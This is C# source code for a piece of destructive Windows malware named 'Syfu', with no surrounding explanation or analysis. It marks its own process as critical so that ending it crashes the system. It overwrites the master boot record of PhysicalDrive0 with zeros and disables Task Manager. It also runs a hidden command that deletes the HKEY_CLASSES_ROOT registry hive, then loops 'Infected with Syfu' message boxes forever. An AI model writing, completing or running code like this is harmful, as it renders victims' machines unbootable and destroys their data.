using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32;

namespace SyFu
{
    public class Class1
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;

        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        public static void Main()
        {
            //BSOD on termination
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            Class1 mbr_nostatic = new Class1();
            Thread mbr = new Thread(mbr_nostatic.mbr_destory);

            Class1 reg_dest = new Class1();

            Class1 msg_loop_static = new Class1();
            Thread msg_looping = new Thread(msg_loop_static.msg_box);

            mbr.Start();
            reg_dest.reg_destory();
            msg_looping.Start();
        }
        public void mbr_destory()
        {
            var mbrData = new byte[MbrSize];
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);

            try
            {
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberofBytesWritten, IntPtr.Zero);
            }
            catch { }
        }

        public void reg_destory()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();

            const string quote = "\"";
            ProcessStartInfo ctrl = new ProcessStartInfo();
            ctrl.FileName = "cmd.exe";
            ctrl.WindowStyle = ProcessWindowStyle.Hidden;
            ctrl.Arguments = @"/k regedit /s" + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
            Process.Start(ctrl);

            ProcessStartInfo reg_kill = new ProcessStartInfo();
            reg_kill.FileName = "cmd.exe";
            reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
            reg_kill.Arguments = @"/k reg delete HKCR /f";
            Process.Start(reg_kill);
        }
        public void msg_box()
        {
            while (true)
            {
                MessageBox.Show("Infected with Syfu");
            }
        }
    }
}